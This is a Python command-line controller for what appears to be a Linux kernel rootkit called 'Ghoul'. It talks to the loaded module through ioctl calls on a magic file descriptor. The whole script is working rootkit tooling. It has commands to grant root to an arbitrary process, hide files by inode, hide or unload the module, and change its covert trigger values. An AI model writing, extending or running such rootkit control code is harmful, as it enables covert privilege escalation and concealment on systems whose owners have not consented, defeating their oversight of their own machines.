#! /bin/python3
import os
import sys
import ctypes


syscall = ctypes.CDLL(None).syscall
SYSCALL_IOCTL_X86_64 = 16
SERVICE_FD = int(os.environ.get('GHOUL_FD', 0)) or 666

SERVICE_SHOW = 0
SERVICE_UNLOAD = 1
SERVICE_CHANGE_FD = 2
SERVICE_PING = 3
SERVICE_CHANGE_PING_ARG = 4
SERVICE_GIVE_ROOT = 5
SERVICE_HIDE_FILE_INODE = 6

PING_ARG = int(os.environ.get('GHOUL_PING_ARG', 0)) or 666


def ioctl(fd: int, cmd: int, arg: int):
    return syscall(SYSCALL_IOCTL_X86_64, fd, cmd, arg)


def show():
    ioctl(SERVICE_FD, SERVICE_SHOW, 0)


def unload():
    ioctl(SERVICE_FD, SERVICE_UNLOAD, 0)


def change_fd():
    if len(sys.argv) != 3:
        print('Usage: ./ghoulctl.py change-fd NEW_FD')
        exit()
    ioctl(SERVICE_FD, SERVICE_CHANGE_FD, int(sys.argv[2]))


def ping():
    err = ioctl(SERVICE_FD, SERVICE_PING, PING_ARG)
    if err == PING_ARG:
        print('Ghoul is loaded')
    else:
        print('Ghoul is not loaded')


def change_ping_arg():
    if len(sys.argv) != 3:
        print('Usage: ./ghuolctl.py change-ping-arg NEW_ARG')
        exit()
    ioctl(SERVICE_FD, SERVICE_CHANGE_PING_ARG, int(sys.argv[2]))


def give_root():
    try:
        pid = int(sys.argv[2])
    except IndexError:
        pid = 0
    ioctl(SERVICE_FD, SERVICE_GIVE_ROOT, pid)


def hide_inode():
    if len(sys.argv) != 3:
        print('Usage: ./ghuolctl.py hide-inode INODE')
        exit()
    ioctl(SERVICE_FD, SERVICE_HIDE_FILE_INODE, int(sys.argv[2]))


def main():
    if len(sys.argv) < 2:
        print('Usage: ./ghoulctl.py COMMAND [ARGS]...')
        exit()
    cmd = sys.argv[1]

    if cmd == 'show':
        show()
    elif cmd == 'unload':
        unload()
    elif cmd == 'change-fd':
        change_fd()
    elif cmd == 'ping':
        ping()
    elif cmd == 'change-ping-arg':
        change_ping_arg()
    elif cmd == 'give-root':
        give_root()
    elif cmd == 'hide-inode':
        hide_inode()
    else:
        print(f'ERROR: unknown command {cmd}')


if __name__ == '__main__':
    main()
